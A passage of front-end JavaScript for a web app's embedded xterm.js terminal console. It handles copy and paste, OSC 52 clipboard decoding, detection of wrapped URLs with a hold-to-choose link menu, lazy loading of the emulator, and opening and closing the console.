    if (!quiet) showToast("Select mode — drag to select · tap Select again to scroll");
  } else if (window.getSelection) {
    // Clear any lingering selection on exit so the scroll handler resumes cleanly
    // (it stands down whenever text is selected).
    window.getSelection().removeAllRanges();
  }
}

let consoleLockY = 0; // page scroll offset captured while the console freezes it
let lastConsoleSpawn = 0; // when the current console attached — crash-loop guard for auto-respawn

// Press feedback for the on-screen key chips: a haptic tick (where the platform
// exposes it — Android; iOS Safari has no web vibrate) plus a visual blink that
// works everywhere.
function consoleKeyFeedback(btn) {
  if (navigator.vibrate) { try { navigator.vibrate(8); } catch (e) { /* ignore */ } }
  btn.classList.remove("flash");
  void btn.offsetWidth; // reflow so the animation restarts on rapid repeats
  btn.classList.add("flash");
}

// The current console selection as text. Desktop uses xterm's own mouse-driven
// selection; touch uses the browser's NATIVE selection over the DOM rows (which
// xterm's getSelection() doesn't see), so prefer that when it's inside the
// terminal. Callers: Copy, Share, and the Share-button visibility.
function consoleHasNativeSelection() {
  const s = window.getSelection && window.getSelection();
  if (!s || s.isCollapsed || !s.toString().trim()) return false;
  const scr = $("pty-screen");
  const node = s.anchorNode;
  const el = node && (node.nodeType === 1 ? node : node.parentNode);
  return Boolean(scr && el && scr.contains(el));
}
function consoleSelectionText() {
  if (consoleHasNativeSelection()) return window.getSelection().toString();
  return consoleTerm ? consoleTerm.getSelection() : "";
}

function consoleCopy() {
  if (!consoleTerm) return;
  // Whatever is selected, else the whole screen — dragging to select is hard on
  // touch, so "copy" with no selection grabs everything. copyText() has the
  // execCommand fallback that works on the plain-http LAN server (no clipboard API).
  let text = consoleSelectionText();
  // A fresh tmux copy (drag / double-tap → OSC 52) that iOS wouldn't let us
  // write passively: consume it here, inside this tap's gesture. Consume-once so
  // a later "copy everything" tap doesn't resurrect a stale selection.
  if (!text && lastConsoleClip) { text = lastConsoleClip; lastConsoleClip = null; }
  if (!text) { consoleTerm.selectAll(); text = consoleTerm.getSelection(); consoleTerm.clearSelection(); }
  if (!text || !text.trim()) { showToast("nothing to copy"); return; }
  copyText(text).then((ok) => showToast(ok ? "copied" : "copy blocked"));
  if (consoleSelectMode) setConsoleSelectMode(false); // painted a region → done, back to scroll
}

function consolePaste() {
  // readText only works in a secure context; on plain http fall back to a native
  // long-press paste onto the terminal (xterm forwards it as console_in).
  if (navigator.clipboard && navigator.clipboard.readText && window.isSecureContext) {
    navigator.clipboard.readText().then(
      (t) => { if (t) consoleSend(t); if (consoleTerm) consoleTerm.focus(); },
      () => { if (consoleTerm) consoleTerm.focus(); showToast("long-press the terminal, then Paste"); });
  } else {
    if (consoleTerm) consoleTerm.focus();
    showToast("long-press the terminal, then Paste");
  }
}

function consoleTerminalTextarea() {
  const s = $("pty-screen");
  return s ? s.querySelector(".xterm-helper-textarea") : null;
}

// The ⌨ chip toggles the soft keyboard: focus summons it, blur hides it (the
// only reliable way to dismiss the iOS keyboard).
function consoleToggleKeyboard() {
  const ta = consoleTerminalTextarea();
  if (ta && document.activeElement === ta) ta.blur();
  else if (consoleTerm) consoleTerm.focus();
}

let consoleFontSize = Math.min(28, Math.max(8, +localStorage.getItem("ptyFontSize") || 13));
function consoleFontStep(delta) {
  consoleFontSize = Math.max(8, Math.min(28, consoleFontSize + delta));
  localStorage.setItem("ptyFontSize", String(consoleFontSize));
  if (consoleTerm) { consoleTerm.options.fontSize = consoleFontSize; consoleFitAndResize(); }
}

function consoleSend(data) {
  if (consoleOpen) send({ type: "console_in", data });
}

// [OSC52-DECODE-START]
// Decode an OSC 52 clipboard payload ("<selection>;<base64>") to its text, or
// null for a clipboard-READ request ("?") or malformed data. base64 → utf-8 via
// atob + escape (atob yields a binary string; escape/decodeURIComponent widen
// it back to the original multibyte characters).
function oscClipboardText(data) {
  const semi = data.indexOf(";");
  const b64 = semi >= 0 ? data.slice(semi + 1) : "";
  if (!b64 || b64 === "?") return null;
  try { return decodeURIComponent(escape(atob(b64))); } catch (e) { return null; }
}
// [OSC52-DECODE-END]

// [CONSOLE-LINKS-START]
// A link provider for the console terminal that finds URLs even when they wrap
// across rows tmux did NOT mark as soft-wrapped (#153). We reconstruct a logical
// line by joining a row with its neighbours whenever the row is packed to the
// right margin (no trailing space) — the geometry signal for a hard wrap — OR
// xterm flagged the next row isWrapped (native soft-wrap). Then we scan the
// joined text for http(s) URLs and map each match back to buffer coordinates.
function consoleLinkProvider(term, onOpen) {
  const URL_RE = /https?:\/\/[^\s"'`<>(){}\[\]|\\^]+/g;
  const stripTrailing = (s) => s.replace(/[)\].,;:!?'"]+$/, ""); // drop sentence punctuation
  const MAX_ROWS = 40; // cap the join so a screenful of full lines can't run away
  const lineStr = (buf, y, trim) => { const ln = buf.getLine(y); return ln ? ln.translateToString(trim) : null; };
  return {
    provideLinks(yOneBased, cb) {
      const buf = term.buffer.active;
      const cols = term.cols;
      const y0 = yOneBased - 1;
      if (lineStr(buf, y0, true) == null) { cb(undefined); return; }
      // Row y continues onto y+1 when the next row is a soft-wrap OR this row is
      // filled to the last column (tmux hard-wrap — no trailing space to trim).
      const continues = (y) => {
        const cur = buf.getLine(y), nxt = buf.getLine(y + 1);
        if (!cur || !nxt) return false;
        if (nxt.isWrapped) return true;
        return cur.translateToString(true).length >= cols;
      };
      let top = y0, bottom = y0;
      while (top > 0 && (y0 - top) < MAX_ROWS && continues(top - 1)) top--;
      while ((bottom - y0) < MAX_ROWS && continues(bottom)) bottom++;
      // Concatenate the block; a row's chars map 1:1 to its columns (ASCII URLs),
      // so a global string index maps to (row, col) via the recorded offsets.
      const parts = [], starts = [];
      let acc = "";
      for (let y = top; y <= bottom; y++) {
        starts.push(acc.length);
        const s = lineStr(buf, y, true) || "";
        parts.push(s);
        acc += s;
      }
      const mapIdx = (gi) => {
        let r = 0;
        while (r + 1 < starts.length && starts[r + 1] <= gi) r++;
        return { y: top + r, x: gi - starts[r] };
      };
      const links = [];
      let m;
      URL_RE.lastIndex = 0;
      while ((m = URL_RE.exec(acc))) {
        const text = stripTrailing(m[0]);
        if (!text) continue;
        try { new URL(text); } catch (e) { continue; } // reject non-URL matches
        const s = mapIdx(m.index), e = mapIdx(m.index + text.length - 1);
        links.push({
          text,
          range: { start: { x: s.x + 1, y: s.y + 1 }, end: { x: e.x + 1, y: e.y + 1 } },
          activate: (ev, uri) => onOpen(ev, uri),
        });
      }
      cb(links.length ? links : undefined);
    },
  };
}
// [CONSOLE-LINKS-END]

// [CONSOLE-LINK-TARGET-START]
// WHERE a URL in the console opens. There are two browsers now — this device's
// own, and aish's remote Chrome, the one that screenshots a page and is signed
// in to sites — and which is wanted depends on the link, so the tap follows a
// REMEMBERED default and a hold offers the choice.
//
// A hold on the console already means Select mode, so this claims the gesture
// ONLY when it landed on a URL (L5 — a recognizer states what it decided the
// touch is). Everywhere else the hold is exactly what it always was.
//
// The default is per DEVICE on purpose. "Your browser" is a different browser on
// the phone than on the Mac, while the aish browser is one shared Chrome — so
// this is a fact about the screen it was set on, not about the owner, and it is
// the one shape of local state that is not a second copy of something shared.
const CONSOLE_LINK_TARGET_KEY = "aish-console-link-target";
const CONSOLE_LINK_HINT_KEY = "aish-console-link-hint";
let consoleLinkMenuUrl = ""; // the URL the open menu is about
let consoleFocusReturn = false; // the terminal was being typed into when the browser took over

// THE MENU DOES NOT ACT UNTIL THE GESTURE THAT RAISED IT IS OVER.
//
// It opens while the finger is still DOWN, and the lift arrives as a synthesised
// click on whatever is under that finger — the scrim, or a row of the menu
// itself where it is clamped up near the bottom of the screen. WebKit
// synthesises that click only for a touch that did not MOVE, which is precisely
// this gesture: the owner reported the menu vanishing the moment he let go, and
// surviving only when he jiggled his finger while holding.
//
// `preventDefault` on touchend is the textbook fix and is still applied, but it
// is not sufficient on a real iPhone (touchend is not always cancelable), and
// nothing here should depend on WHICH event a platform decides to send. So the
// menu simply refuses every dismissal and every choice until it is armed, which
// the end of the touch does. `CONSOLE_LINK_MENU_LOST_MS` is the backstop for a
// touch whose end never arrives — a stuck menu is worse than a slow one.
// And a WINDOW is not enough either, which the owner found next: with the
// keyboard SHOWN the menu behaved, with it hidden the hold still dismissed
// itself. That split is the tell — iOS spends the lift's click on dismissing
// the keyboard when there is one, so the click only reaches the page when there
// is not, and when it does reach it, it can arrive well after any window short
// enough to keep the menu responsive.
//
// So the lift's click is identified by WHERE it lands rather than by when: it
// is at the point the finger was, and there is exactly ONE of it. It is
// swallowed once, whenever it turns up; `CONSOLE_LINK_MENU_STRAY_MS` only stops
// the expectation lingering into a later, deliberate tap on the same spot.
// Everything else stays instantly answerable, which a long arming delay would
// have cost.
const CONSOLE_LINK_MENU_ARM_MS = 400;
const CONSOLE_LINK_MENU_LOST_MS = 1500;
const CONSOLE_LINK_MENU_STRAY_MS = 1500;
const CONSOLE_LINK_MENU_SLOP = 28; // px around the hold point the lift can land in
let consoleLinkMenuArmed = false;
let consoleLinkMenuArmTimer = 0;
let consoleLinkMenuStray = null; // {x, y, until} — the lift's click, still owed

function armConsoleLinkMenu(delay) {
  clearTimeout(consoleLinkMenuArmTimer);
  if (!delay) { consoleLinkMenuArmed = true; return; }
  consoleLinkMenuArmTimer = setTimeout(() => { consoleLinkMenuArmed = true; }, delay);
}

function disarmConsoleLinkMenu() {
  consoleLinkMenuArmed = false;
  armConsoleLinkMenu(CONSOLE_LINK_MENU_LOST_MS);
}

/** Called by the console's touch handler when the hold that raised the menu
 *  ends, with the point it was held at — the lift's own click is still owed. */
function consoleHoldEnded(x, y) {
  consoleLinkMenuStray = { x, y, until: Date.now() + CONSOLE_LINK_MENU_STRAY_MS };
  armConsoleLinkMenu(CONSOLE_LINK_MENU_ARM_MS);
}

/** Is this click the tail of the hold that opened the menu, rather than an
 *  answer to it? One-shot: the lift owes exactly one click, so consuming it
 *  hands the next one — a real tap, at the same spot or not — straight through. */
function consoleLinkMenuStrayClick(x, y) {
  const stray = consoleLinkMenuStray;
  if (!stray) return false;
  if (Date.now() > stray.until) { consoleLinkMenuStray = null; return false; }
  if (Math.abs(x - stray.x) > CONSOLE_LINK_MENU_SLOP) return false;
  if (Math.abs(y - stray.y) > CONSOLE_LINK_MENU_SLOP) return false;
  consoleLinkMenuStray = null;
  return true;
}

function consoleLinkMenuReady() {
  return consoleLinkMenuArmed;
}

function consoleLinkTarget() {
  try {
    return localStorage.getItem(CONSOLE_LINK_TARGET_KEY) === "aish" ? "aish" : "system";
  } catch (e) {
    return "system"; // no storage (private mode) → the browser you came from
  }
}

function setConsoleLinkTarget(target) {
  try {
    localStorage.setItem(CONSOLE_LINK_TARGET_KEY, target === "aish" ? "aish" : "system");
  } catch (e) { /* the menu still reads back what it just set */ }
  const state = $("clink-default-state");
  if (state) state.textContent = target === "aish" ? "aish browser" : "your browser";
}

// Which terminal cell a screen point sits on — 1-based, and in BUFFER rows,
// which is what provideLinks is asked in. xterm lays its rows out as a uniform
// grid inside .xterm-screen, so this needs no private API and no per-row
// elements; that is also what makes it testable with no layout engine.
function consoleCellAt(term, screen, x, y) {
  if (!term || !screen || !term.cols || !term.rows) return null;
  const box = (screen.querySelector && screen.querySelector(".xterm-screen")) || screen;
  const r = box.getBoundingClientRect();
  if (!r || !r.width || !r.height) return null;
  if (x < r.left || x >= r.right || y < r.top || y >= r.bottom) return null;
  const buf = term.buffer && term.buffer.active;
  return {
    x: Math.floor((x - r.left) / (r.width / term.cols)) + 1,
    y: ((buf && buf.viewportY) || 0) + Math.floor((y - r.top) / (r.height / term.rows)) + 1,
  };
}

// The URL under a point, or null. It asks the SAME provider the tap goes
// through, so the menu can never disagree with the tap about where a link
// starts and ends — including one joined back together across wrapped rows,
// where a second implementation would offer the fragment on the row pressed.
function consoleLinkAt(term, screen, x, y) {
  const cell = consoleCellAt(term, screen, x, y);
  if (!cell) return null;
  let found = null;
  try {
    consoleLinkProvider(term, () => {}).provideLinks(cell.y, (links) => {
      for (const link of links || []) {
        const r = link.range;
        if (cell.y < r.start.y || cell.y > r.end.y) continue;
        if (cell.y === r.start.y && cell.x < r.start.x) continue;
        if (cell.y === r.end.y && cell.x > r.end.x) continue;
        found = link.text;
      }
    });
  } catch (e) {
    return null; // a hit test that throws must leave the hold meaning Select
  }
  return found;
}

function consoleLinkMenuOpen() {
  const menu = $("clink-menu");
  return Boolean(menu && !menu.hidden);
}

// The ONE place a console URL is opened (L1). `target` is an explicit choice
// from the menu; without it the remembered default decides.
function openConsoleLink(url, target) {
  // A hold that opened the menu is followed by the lift's SYNTHESISED CLICK on
  // the link underneath — which would open it in the default browser behind the
  // menu still asking where to open it. An explicit choice is never refused.
  if (!target && consoleLinkMenuOpen()) return null;
  if (!url) return null;
  const where = target === "aish" || target === "system" ? target : consoleLinkTarget();
  closeConsoleLinkMenu();
  if (where === "aish") {
    // The console STAYS, and the browser opens OVER it: style.css raises the
    // sheet and its backdrop above the overlay while `body.console-open`.
    // Closing the browser therefore shows the terminal again — still running
    // the command whose link you held, which for a sign-in is the whole point:
    // you come back to the prompt that is waiting for the code.
    //
    // xterm's helper textarea keeps the keystrokes otherwise, so a URL typed
    // into the browser's address bar would land in the terminal. Whether it
    // HAD focus is remembered, so the console gets it back only if it was
    // where you were typing — a phone with the keyboard down does not want it
    // summoned on the way out.
    const ta = consoleTerminalTextarea();
    consoleFocusReturn = Boolean(ta && document.activeElement === ta);
    if (ta) ta.blur();
    openBrowserView(url);
  } else {
    window.open(url, "_blank", "noopener");
  }
  // Only a TAP is told about the hold. An explicit target came from the menu,
  // whose existence is the thing the hint is for.
  if (!target) hintConsoleLinkHold();
  return where;
}

// Holding a link is not a gesture anyone would guess at, and there is no widget
// to advertise it (the console's own rule: a gesture over a widget). So it is
// said ONCE, on the first console link this device ever opens.
function hintConsoleLinkHold() {
  try {
    if (localStorage.getItem(CONSOLE_LINK_HINT_KEY)) return;
    localStorage.setItem(CONSOLE_LINK_HINT_KEY, "1");
  } catch (e) {
    return; // no storage → no way to say it once, so don't say it at all
  }
  showToast("hold a link to choose where it opens");
}

// Give the terminal the keyboard back when the browser over it goes away —
// only if it was the thing being typed into. Hung off `bvEndIfOpen`, the one
// funnel every dismissal of that sheet already goes through (the BROWSER-VIEW
// end fence), rather than off the Close button alone.
function restoreConsoleFocus() {
  if (!consoleFocusReturn) return;
  consoleFocusReturn = false;
  if (consoleOpen && consoleTerm) consoleTerm.focus();
}

function closeConsoleLinkMenu() {
  const menu = $("clink-menu");
  const scrim = $("clink-scrim");
  if (menu) menu.hidden = true;
  if (scrim) scrim.hidden = true;
  clearTimeout(consoleLinkMenuArmTimer);
  consoleLinkMenuArmed = false;
  consoleLinkMenuStray = null;
}

// Anchored at the finger, clamped inside the viewport. The URL is set as TEXT:
// it came out of a shell's output and is nobody's markup.
function openConsoleLinkMenu(url, x, y) {
  const menu = $("clink-menu");
  if (!menu) return;
  consoleLinkMenuUrl = url;
  const label = $("clink-url");
  if (label) label.textContent = url;
  setConsoleLinkTarget(consoleLinkTarget()); // paint the current default on the toggle
  const scrim = $("clink-scrim");
  if (scrim) scrim.hidden = false;
  menu.style.visibility = "hidden"; // measure before placing, as the ＋ menu does
  menu.hidden = false;
  const w = menu.offsetWidth || 240;
  const h = menu.offsetHeight || 210;
  const vw = window.innerWidth || w + 16;
  const vh = window.innerHeight || h + 16;
  menu.style.left = `${Math.max(8, Math.min(x - w / 2, vw - w - 8))}px`;
  menu.style.top = `${Math.max(8, Math.min(y + 14, vh - h - 8))}px`;
  menu.style.visibility = "";
  // Usable at once for a caller with no gesture still in flight (a desktop
  // right-click). The touch path disarms straight after — see consoleHoldAt.
  armConsoleLinkMenu(0);
}

// What a stationary hold MEANS, decided in one place: the link menu when it
// landed on a URL, otherwise the Select mode the console has always had. The
// caller keeps ownership of Select mode, so this can never half-enter it.
function consoleHoldAt(term, screen, x, y) {
  const url = consoleLinkAt(term, screen, x, y);
  if (!url) return "select";
  openConsoleLinkMenu(url, x, y);
  disarmConsoleLinkMenu(); // the finger is still down; its lift is not a choice
  return "link";
}
// [CONSOLE-LINK-TARGET-END]

// Both refuse the tail of the hold that opened the menu — the lift's own click,
// wherever it lands and whenever it turns up — and anything at all until the
// gesture is over.
$("clink-scrim").onclick = (e) => {
  if (consoleLinkMenuStrayClick(e.clientX, e.clientY)) return;
  if (consoleLinkMenuReady()) closeConsoleLinkMenu();
};
$("clink-menu").addEventListener("click", (e) => {
  const item = e.target.closest(".menu-item");
  if (!item) return;
  if (consoleLinkMenuStrayClick(e.clientX, e.clientY)) return;
  if (!consoleLinkMenuReady()) return;
  switch (item.dataset.act) {
    case "aish": openConsoleLink(consoleLinkMenuUrl, "aish"); break;
    case "system": openConsoleLink(consoleLinkMenuUrl, "system"); break;
    case "copy": {
      const url = consoleLinkMenuUrl;
      closeConsoleLinkMenu();
      copyText(url).then((ok) => showToast(ok ? "copied" : "copy blocked"));
      break;
    }
    // Changing the default is its OWN row and stays open showing its new state:
    // a menu that silently rewrote the tap default as a side effect of one
    // choice would send every later tap somewhere nobody asked it to go.
    case "default":
      setConsoleLinkTarget(consoleLinkTarget() === "aish" ? "system" : "aish");
      break;
  }
});

// Desktop: right-click ON a link offers the same choice. Off a link the browser
// keeps its own menu — xterm rows are plain text, so nothing is taken away.
$("pty-screen").addEventListener("contextmenu", (e) => {
  if (!consoleOpen || !consoleTerm) return;
  const url = consoleLinkAt(consoleTerm, $("pty-screen"), e.clientX, e.clientY);
  if (!url) return;
  e.preventDefault();
  openConsoleLinkMenu(url, e.clientX, e.clientY);
});

// Reflow to the current overlay size and tell the server (TIOCSWINSZ), so the
// program wraps where xterm shows it.
function consoleFitAndResize() {
  if (!consoleOpen || !consoleFit || !consoleTerm) return;
  try { consoleFit.fit(); } catch (e) { /* container not laid out yet */ }
  send({ type: "console_resize", cols: consoleTerm.cols, rows: consoleTerm.rows });
}

// Toggle the Quake console: open if hidden, hide if shown. The single entry
// point for the top-bar icon, the ＋-menu item, and the Ctrl/Cmd+\ shortcut.
function toggleConsole() {
  if (consoleOpen) { hideConsole(); return; }
  openConsole();
}

// [XTERM-LAZY-START]
// xterm.js (~285 KB) is the terminal emulator — needed ONLY when the console
// opens, which most sessions never do. Keeping it off the boot path is the big
// half of the white-screen fix (#180): it no longer downloads, parses, or
// executes before the first chat can paint. These assets are loaded on demand
// the first time the console opens, stamped with the page rev so a device
// caches them immutably and a deploy busts them (the old static <script> tags
// were unversioned — a known stale-after-update gap).
function xtermAssetUrls(base, rev) {
  const v = rev ? `?v=${rev}` : "";
  return {
    css: `${base}vendor/xterm.css${v}`,
    js: [`${base}vendor/xterm.js${v}`, `${base}vendor/xterm-addon-fit.js${v}`],
  };
}

let xtermReady = null; // memoized: load at most once per page
function ensureXterm() {
  if (window.Terminal && window.FitAddon) return Promise.resolve();
  if (xtermReady) return xtermReady;
  const urls = xtermAssetUrls(BASE, PAGE_REV);
  if (!document.querySelector('link[data-xterm-css]')) {
    const link = document.createElement("link");
    link.rel = "stylesheet";
    link.href = urls.css;
    link.dataset.xtermCss = "1";
    document.head.appendChild(link);
  }
  const loadScript = (src) =>
    new Promise((resolve, reject) => {
      const s = document.createElement("script");
      s.src = src;
      s.onload = resolve;
      s.onerror = () => reject(new Error(`failed to load ${src}`));
      document.head.appendChild(s);
    });
  // Sequential: the fit addon references the Terminal global from xterm.js.
  xtermReady = urls.js
    .reduce((chain, src) => chain.then(() => loadScript(src)), Promise.resolve())
    .catch((err) => {
      xtermReady = null; // let a later open retry a transient failure
      throw err;
    });
  return xtermReady;
}
// [XTERM-LAZY-END]

async function openConsole() {
  closeSheets();
  // Attach is requested LAST, once the terminal exists (see the send at the end
  // of this function). Sending console_open up here raced the server's
  // console_started reply — the ONLY source of the real cwd/command label — ahead
  // of consoleTerm being built; onConsoleStarted drops any event that lands before
  // the terminal exists, so the reply was lost and "attaching…" sat over a working
  // console forever. The lazy-xterm await widened that window. Building the
  // terminal before requesting attach closes the race at its root (the
  // consoleStartedSeen guard below is now just belt-and-suspenders). Here we only
  // CHECK the socket is live — no send yet.
  if (!ws || ws.readyState !== WebSocket.OPEN) {
    showToast("not connected — reconnecting…");
    return;
  }
  if (consoleOpen) return; // already showing (e.g. a reconnect reattach)
  // BELOW the early returns, deliberately: the flag's invariant is "false only
  // while an open is in progress", and a call that opens nothing starts no open.
  // Armed above, a no-op call (already open, or no socket) disarmed the guard
  // and never re-armed it — console_started fires once per open, so from then on
  // any provisional write could clobber a real label permanently (#181).
  consoleStartedSeen = false; // a new open: no real label for it yet
  if (location.hash !== "#console") history.replaceState(null, "", "#console"); // deep-link: survives reload/restart
  $("pty-overlay").hidden = false;
  // Freeze the page behind the overlay at its current scroll offset (iOS: a
  // position:fixed body is the only reliable lock; restored on close).
  consoleLockY = window.scrollY || 0;
  document.body.style.top = `-${consoleLockY}px`;
  document.body.classList.add("console-open");
  $("pty-share").hidden = true;
  setProvisionalConsoleStatus("attaching…");

  const screen = $("pty-screen");
  screen.textContent = "";
  // First open on this page loads the emulator (lazy — see ensureXterm). A
  // reopen resolves instantly. If it fails (offline mid-open), surface it and
  // leave the overlay recoverable rather than throwing into a half-open state.
  if (!window.Terminal || !window.FitAddon) {
    setProvisionalConsoleStatus(CONSOLE_LOADING);
    try { await ensureXterm(); }
    catch { setConsoleStatus("couldn't load the terminal — check your connection"); return; }
    if (!consoleOpen && $("pty-overlay").hidden) return; // closed while loading
    // Emulator ready: drop the loading text — unless console_started has since
    // landed with the real label, which the guard inside this helper honours.
    setProvisionalConsoleStatus("attaching…");
  }
  consoleTerm = new Terminal({
    cursorBlink: true,
    // The config-served mono font (aish-mono) if present, else system mono —
    // the same var(--mono) stack the code blocks and command output use.
    fontFamily: '"aish-mono", ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, monospace',
    fontSize: consoleFontSize,
    scrollback: 5000,
    // Mouse reporting is forwarded to the program when it asks for it (tmux/vim
    // mouse mode), so a swipe scrolls the app's panes; otherwise the touch
    // scrolls xterm's own scrollback.
    theme: CATPPUCCIN_MOCHA,
  });
  consoleFit = new FitAddon.FitAddon();
  consoleTerm.loadAddon(consoleFit);
  // Clickable URLs (#148/#153): auth CLIs print a login URL that wraps across
  // rows. xterm's own web-links addon only rejoins rows it sees as soft-wrapped
  // (isWrapped) — but our console runs inside tmux, which repaints its pane with
  // absolute cursor moves, so a wrapped URL arrives as SEPARATE, non-wrapped
  // rows the addon can't join. consoleLinkProvider joins by GEOMETRY instead.
  // A tap opens it wherever this device has been told to open links — see
  // [CONSOLE-LINK-TARGET], which also owns the hold that offers the choice.
  consoleTerm.registerLinkProvider(
    consoleLinkProvider(consoleTerm, (event, uri) => openConsoleLink(uri))
  );
  // Clipboard bridge (#153): with tmux `set-clipboard on`, a copy on the REMOTE
  // terminal (a mouse-drag selection, `y` in copy-mode, vim, …) emits an OSC 52
  // sequence carrying the text. xterm.js ignores OSC 52 by default; handle it and
  // write the decoded text to the LOCAL desktop clipboard. A "?" payload is a
  // clipboard-READ request — we never answer it (don't leak the clipboard back).
  consoleTerm.parser.registerOscHandler(52, (data) => {
    const text = oscClipboardText(data);
    if (text) {
      // Stash it so the Copy button can grab it within a real tap, then TRY an
      // immediate write — succeeds on desktop; on iOS (no user gesture here) it
      // fails, so tell the user to tap Copy, which does have the gesture.
      lastConsoleClip = text;
      copyText(text).then((ok) =>
        showToast(ok ? "copied to clipboard" : "selection ready — tap Copy to grab it"));
    }
    return true;
  });
  consoleTerm.open(screen);
  // Focus guard: while Select mode is on, the terminal textarea must stay
  // BLURRED (keyboard down) or the document selection won't stick. xterm
  // re-focuses its textarea on every touch (its mousedown handler), so a
  // one-time blur loses the race — the keyboard springs back. Re-blur on any
  // focus while selecting; harmless (and inactive) the rest of the time.
  const _selTa = consoleTerminalTextarea();
  if (_selTa) {
    _selTa.addEventListener("focus", () => {
      if (!consoleSelectMode) return;
      _selTa.blur();
      setTimeout(() => { if (consoleSelectMode && document.activeElement === _selTa) _selTa.blur(); }, 0);
    });
  }
  // THE input path; the model never reaches it. The sticky Ctrl chip (#148):
  // while "armed" or "locked" the next single char is sent as its control code
  // (Ctrl-A tmux prefix, Ctrl-F page down, …); "armed" is one-shot (disarms
  // after the key), "locked" persists until the chip is tapped again.
  consoleTerm.onData((data) => {
    if (consoleCtrlMode !== "off" && data.length === 1) {
      const c = data.toUpperCase().charCodeAt(0);
      if (c >= 64 && c <= 95) data = String.fromCharCode(c & 0x1f); // ^@ .. ^_
      if (consoleCtrlMode === "armed") setConsoleCtrlMode("off"); // one-shot
    }
    consoleSend(data);
  });
  // Hardware Esc HIDES the overlay (#143) instead of going to the program; the
  // on-screen "esc" chip still sends \x1b. Returning false stops xterm from
  // handling the key (and lets it bubble to the global Esc handler too).
  consoleTerm.attachCustomKeyEventHandler((e) => {
    if (e.type !== "keydown") return true;
    // Esc is a REAL terminal key here (vim/tmux/less) — let xterm send it to the
    // PTY; the console is closed via its button or Ctrl+\, never Esc.
    // stopPropagation on Ctrl+\ so the document handler doesn't re-toggle the
    // console open right after we close it.
    if ((e.metaKey || e.ctrlKey) && e.key === "\\") { e.preventDefault(); e.stopPropagation(); hideConsole(); input.focus(); return false; }
    // Cmd/Ctrl+Shift+C to copy the xterm selection — never plain Ctrl+C (that's
    // SIGINT to the program). Cmd (meta) alone works too on macOS. Paste is NOT
    // intercepted: xterm handles the browser paste event natively, and grabbing
    // it here too pasted the text twice (#153).
    const copyCombo = (e.metaKey && !e.ctrlKey) || (e.ctrlKey && e.shiftKey);
    if (copyCombo && (e.key === "c" || e.key === "C")) { consoleCopy(); return false; }
    return true;
  });
  consoleTerm.onSelectionChange(() => {
    $("pty-share").hidden = !(consoleTerm && consoleTerm.getSelection().trim());
  });
  consoleOpen = true;
  // Terminal is fully built and its handlers wired — NOW request attach. The
  // server's console_started/console_out replies can only arrive after this, so
  // consoleTerm is guaranteed present when onConsoleStarted runs and the real
  // label always lands (fixing the stuck "attaching…"). On a reconnect the
  // re-attach is sent from onHello instead, where the terminal already exists.
  send({ type: "console_open" });
  lastConsoleSpawn = Date.now();
  consoleReflowViewport();
  requestAnimationFrame(consoleReflowViewport); // once the overlay has laid out
  setTimeout(consoleReflowViewport, 120); // and after the mobile keyboard settles
  // A webfont (the optional PragmataPro) loads async; xterm measures cell size at
  // open, so refit once it's ready or the grid is sized to the fallback metrics.
  if (document.fonts && document.fonts.load) {
    document.fonts.load(`16px "aish-mono"`).then(
      () => { if (consoleOpen) consoleReflowViewport(); }, () => {});
  }
  consoleTerm.focus();
  // First console open of this page load: if an unsent dictation survived the
  // reload (app update, PWA relaunch), bring the pad back with it — without
  // starting the mic. Once consumed, later opens leave the pad closed unless
  // you ask for it; the draft is still restored when you do open it.
  if (padRestorePending) {
    padRestorePending = false;
    if (padDraft()) openConsolePad(false);
  }
}

// Hide/detach the overlay — the console keeps running server-side (reopening
// shows current state). Tells the server to stop fanning output at us.
function hideConsole() {
  if (!consoleOpen) return;
  if (padOpen()) closeConsolePad(); // never leave the mic live behind a hidden overlay
  closeConsoleLinkMenu(); // it is raised over the console; it goes with it
  consoleOpen = false;
  send({ type: "console_close" });
  if (location.hash === "#console") history.replaceState(null, "", location.pathname + location.search);
  const ov = $("pty-overlay");
  ov.hidden = true;
  document.body.classList.remove("console-open");
  document.body.style.top = "";
  window.scrollTo(0, consoleLockY || 0); // restore the page scroll we froze
  ov.style.height = ""; ov.style.top = ""; ov.style.paddingBottom = ""; // drop viewport-fit inline styles
  $("pty-share").hidden = true;
  setConsoleCtrlMode("off");
  if (consoleSelectMode) setConsoleSelectMode(false);
  if (consoleTerm) { consoleTerm.dispose(); consoleTerm = null; consoleFit = null; }
}

function onConsoleStarted(event) {
  if (!consoleOpen || !consoleTerm) return;
  consoleTerm.reset();
  consoleStartedSeen = true; // the real label has landed; stop writing placeholders
  // Header shows the console's identity (e.g. "tmux · aish-console"), NOT a cwd.
  // The server only knows the DEFAULT session's workspace, not the tmux pane's
  // real directory, so on a reattach the old cwd label read ~/aish while the
  // shell was elsewhere — and it went stale the moment you cd'd anyway. The
  // terminal's own prompt is the live, correct source of the cwd.
  setConsoleStatus(event.command);
  consoleFitAndResize();
}

function onConsoleOut(data) {
  if (consoleTerm) consoleTerm.write(data);
}

function onConsoleExit(code) {
  if (!consoleOpen) return; // overlay already hidden — nothing to do
  // The shell/tmux ended (the user typed `exit`, or detached). Respawn in place
  // so they don't have to close & reopen — `tmux new-session -A` reattaches a
  // surviving session (detach) or starts a fresh one (exit). Guard a crash-loop:
  // if it dies again almost immediately, stop and leave the message up.
  if (Date.now() - lastConsoleSpawn < 1500) {
    setConsoleStatus(`exited (${code}) — tap the console button to retry`, true);
    if (consoleTerm) { consoleTerm.dispose(); consoleTerm = null; consoleFit = null; }
    consoleOpen = false;
    return;
  }
  if (consoleTerm) { consoleTerm.dispose(); consoleTerm = null; consoleFit = null; }
  consoleOpen = false; // let openConsole() run its full attach path again
  openConsole();
}

// Wire the overlay's controls once at load. Share sends the xterm SELECTION to
// the chat as model context (the only path from the terminal to the model, and
// only on this explicit user action — see onSelectionChange for the button's
// visibility).
$("pty-close").onclick = () => hideConsole();
$("pty-font-dec").onclick = () => consoleFontStep(-1);
$("pty-font-inc").onclick = () => consoleFontStep(1);
// The contextual Copy button in the console header: it appears only when text
// is selected, so it copies THAT selection (never "all"), then clears it and
// leaves Select mode. Handled on POINTERDOWN with preventDefault: tapping a
// button otherwise collapses the current selection before a click handler runs,
// so we'd read nothing (and neither copy nor exit). preventDefault keeps the
// selection intact, and pointerdown is still a user gesture for the clipboard.
$("pty-share").addEventListener("pointerdown", (e) => {
  e.preventDefault();
  const sel = consoleSelectionText().trim();
  if (sel) copyText(sel).then((ok) => showToast(ok ? "copied" : "copy blocked"));
  else showToast("nothing selected");
  if (window.getSelection) window.getSelection().removeAllRanges();
